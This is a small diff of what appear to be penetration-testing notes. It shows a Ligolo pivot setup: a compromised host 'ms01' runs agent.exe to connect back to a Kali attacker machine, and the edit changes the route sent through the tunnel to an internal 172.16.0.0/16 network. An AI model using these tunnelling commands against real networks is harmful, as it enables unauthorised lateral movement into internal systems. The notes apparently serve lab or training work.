@@ -114,7 +114,7 @@ ms01: agent.exe -connect kali_ip:11601 -ignore-cert
 kali: session
 kali: 1
 kali: ifconfig
-kali: sudo ip route add 10.10.120.0/24 dev ligolo
+kali: sudo ip route add 172.16.0.0/16(second interface) dev ligolo
 kali: session;1
 kali: start
 kali: listener_list
